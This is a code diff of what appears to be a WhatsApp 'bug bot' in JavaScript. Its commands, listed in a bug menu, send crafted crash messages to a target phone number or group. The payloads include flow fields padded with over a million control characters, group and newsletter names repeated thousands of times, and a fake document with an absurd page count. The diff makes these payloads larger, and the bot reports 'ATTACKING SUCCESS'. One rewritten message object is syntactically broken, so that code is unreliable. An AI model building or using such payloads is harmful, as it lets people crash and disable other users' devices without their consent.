@@ -200,7 +200,7 @@ delete client.autoshalat[m.chat]
                                 title: global.namabot,
                                 body: global.namaCreator,
                                 thumbnailUrl: 'https://b.top4top.io/p_31995kalq0.jpg',
-                                sourceUrl: global.isLink,
+                                sourceUrl: 'wa.me/settings',
                                 mediaType: 1,
                             }
                             }
@@ -341,7 +341,7 @@ const wanted = {
                     },
                     "nativeFlowResponseMessage": {
                         "name": "galaxy_message",
-                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(1020000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                         "version": 3
                     }
                 }
@@ -409,7 +409,7 @@ const wanted = {
                                 newsletterName: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚" + "ꦾ".repeat(155000),
                                 jpegThumbnail: "",
                                 caption: "ꦽ".repeat(155000),
-                                inviteExpiration: Date.now() + 1814400000,
+                                inviteExpiration: Date.now() + 18144000000,
                             },
                         },
                     },
@@ -1093,19 +1093,19 @@ const bugmenu = `┏━━━「 𝐕𝐈𝐏 ☇ 𝐓𝐙𝐘︎ 」━━━�
 ┃┗⊱
 ┗━━━━━━━━━⬣
 ┏─『 \`𝐂𝐎𝐎𝐔𝐒𝐄 𝐁𝐔𝐆\` 』
-│ ◈ xvip 628xxxx
-│ ◈ stuk 628xxxx
-│ ◈ flow 628xxxx
-│ ◈ vip 628xxxx
-│ ◈ Tzy 628xxxx
-│ ◈ attack 628xxxx
-│ ◈ andro 628xxxx
-│ ◈ ios 628xxxx
-│ ◈ crashios 628xxxx
+│ ◈ *xvip* 628xxxx
+│ ◈ *xbeta* 628xxxx
+│ ◈ *crashui* 628xxxx
+│ ◈ *vip* 628xxxx
+│ ◈ *Tzy* 628xxxx
+│ ◈ *attack* 628xxxx
+│ ◈ *andro* 628xxxx
+│ ◈ *ios* 628xxxx
+│ ◈ *crashios* 628xxxx
 │ ◈ 
 │ ◈ *New Bug*
-│ ◈ xdroid 628xxxx
-│ ◈ xweb 628xxxxxxx
+│ ◈ *xdroid* 628xxxx
+│ ◈ *xweb* ( *_BUG DI TEMPAT_* )
 │ ◈ 
 │ ◈ *New Bug Group*
 │ ◈ xgroup 123xxxxxxxx@g.us
@@ -2128,18 +2128,17 @@ reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Vi
 }
 break
 
-case 'xbeta': case 'crashui': 
+case 'xdroid': case 'xbeta': case 'crashui': 
 if (!isPremium) return reply(mess.only.premium)
 if (!q) return reply(`Example: ${prefix + command} 62×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(bugres)
 for (let i = 0; i < 3; i++) {
-await buk1(viper, target, "Punten", 1020, ptcp = true);
-sendQP(target, wanted)
-await sendQP(target, wanted)
-await beta2(viper, target)
-await sendSessionStructure(target, wanted)
-await beta1(viper, target)
+sendQP(target, { ptcp: true });
+await sendQP(target, { ptcp: true });
+await beta2(target, { ptcp: true });
+await sendSessionStructure(target, { ptcp: true });
+await beta1(target, { ptcp: true });
 darkphonk = fs.readFileSync('./database/suki.mp3')
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
@@ -2155,12 +2154,12 @@ if (!q) return reply(`Example: ${prefix + command} 62×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(bugres)
 for (let i = 0; i < 3; i++) {
-await buk1(viper, target, "Semoga Tertarik", 1020000, ptcp = true);
+await buk1(viper, target, { ptcp: true });
 sendQP(target, wanted)
 await sendQP(target, wanted)
-await beta2(viper, target, wanted)
+await beta2(viper, target, { ptcp: true });
 await sendSessionStructure(target, wanted)
-await beta1(viper, target, wanted)
+await beta1(viper, target, { ptcp: true });
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
 
@@ -2177,12 +2176,12 @@ if (!q) return reply(`Example: ${prefix + command} 62×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(bugres)
 for (let i = 0; i < 3; i++) {
-await buk1(viper, target, "Punten", 1020000, ptcp = true);
+await buk1(viper, target, { ptcp: true });
 sendQP(target, wanted)
 await sendQP(target, wanted)
-await beta2(viper, target, wanted)
+await beta2(viper, target, { ptcp: true });
 await sendSessionStructure(target, wanted)
-await beta1(viper, target, wanted)
+await beta1(viper, target, { ptcp: true });
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
 
@@ -2220,12 +2219,12 @@ if (!q) return reply(`Example: ${prefix + command} 62×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(bugres)
 for (let i = 0; i < 3; i++) {
-await buk1(viper, target, "Punten", 1020000, ptcp = true);
+await buk1(viper, target, { ptcp: true });
 sendQP(target, wanted)
 await sendQP(target, wanted)
-await beta2(viper, target, wanted)
+await beta2(viper, target, { ptcp: true });
 await sendSessionStructure(target, wanted)
-await beta1(viper, target, wanted)
+await beta1(viper, target, { ptcp: true });
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
 
@@ -2236,7 +2235,7 @@ reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
 > Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker`)
 break
 
-case 'xdroid':
+case 'xeon':
 if (!isPremium) return reply(mess.only.premium)
 	if (!q) return reply(`Example:\n ${prefix + command} 91xxx`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
@@ -2300,19 +2299,22 @@ async function xgc4(victim) {
             }
         }
 async function xgc(victim){
-	viper.relayMessage(victim,{                viewOnceMessage: {
-message: {
-                        messageContextInfo: {
-                            deviceListMetadataVersion: 2,
-                            deviceListMetadata: {},
-                        }, 
-    "extendedTextMessage": {
-        "text": "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚" ,
-        "previewType": true,
-        "contextInfo": {
-            "stanzaId": "B69F7CFEE38571AB03CD9DEEFAD69605",
-            "participant": "5518998215209@s.whatsapp.net",
-            "quotedMessage": { "documentMessage": {"url":"https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true","mimetype":"application/pdf","fileSha256":"oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=","fileLength":null,"pageCount":99999999999999,"contactVcard":true,"caption":'͡𑰵',"mediaKey":"yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=","fileName": '> cart; ',"fileEncSha256":"0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=","directPath":"/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0","mediaKeyTimestamp":"1714145232","thumbnailDirectPath":"/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0","thumbnailSha256":"oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=","thumbnailEncSha256":"G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=","jpegThumbnail":"/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==","thumbnailHeight":172,"thumbnailWidth":480},forwardingScore: 508,isForwarded: true,forwardedNewsletterMessageInfo: {newsletterJid: "0@newsletter",serverMessageId: 100,newsletterName:"🚔 > ursoziingod & crash;"}}}},
+	viper.relayMessage(victim,
+	{
+	viewOnceMessage: {
+	   message: {
+	      messageContextInfo: {
+	         deviceListMetadataVersion: 2,
+	           deviceListMetadata: {}, },
+	           "extendedTextMessage": {
+	             "text": "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚" ,
+	             "previewType": true,
+	             "contextInfo": {
+	             "stanzaId"
+	             "B69F7CFEE38571AB03CD9DEEFAD69605",
+	             "participant": "5518998215209@s.whatsapp.net",
+	             "quotedMessage": { "documentMessage":
+	             {"url":"https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true","mimetype":"application/pdf","fileSha256":"oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=","fileLength":null,"pageCount":99999999999999,"contactVcard":true,"caption":'͡𑰵',"mediaKey":"yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=","fileName": '> cart; ',"fileEncSha256":"0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=","directPath":"/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0","mediaKeyTimestamp":"1714145232","thumbnailDirectPath":"/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0","thumbnailSha256":"oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=","thumbnailEncSha256":"G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=","jpegThumbnail":"/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==","thumbnailHeight":172,"thumbnailWidth":480},forwardingScore: 508,isForwarded: true,forwardedNewsletterMessageInfo: {newsletterJid: "0@newsletter",serverMessageId: 100,newsletterName:"🚔 > 𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚"}}}},
        }}},{})
 	}
 	
@@ -2320,7 +2322,7 @@ message: {
 		await viper.relayMessage(victim, {
 'groupInviteMessage': {
 "inviteExpiration": Math.floor(Date.now() / 1000) + 31536000,
-"groupName":` 𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚`.repeat(1500),
+"groupName":` 𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚`.repeat(6666),
 'groupJid': '120363047626537933@g.us',
 'inviteExpiration': '999',
 'caption': '> ㅤㅤㅤㅤㅤㅤㅤ',
@@ -2343,7 +2345,7 @@ contactVcard: true
 'forwardedNewsletterMessageInfo': {
 'newsletterJid': '120363222395675670@newsletter',
 'serverMessageId': 1,
-'newsletterName': "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚".repeat(1500)
+'newsletterName': "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚".repeat(10000)
 }
 }
 }
@@ -2410,7 +2412,7 @@ catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
 "thumbnail": messa.imageMessage,
 "jpegThumbnail": m,
 "firstImageId": 99999999,
-"url": "wa.me/5512981791389"
+"url": "wa.me/𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚".repeat(10000)
 },
 "businessOwnerJid": from,
 }
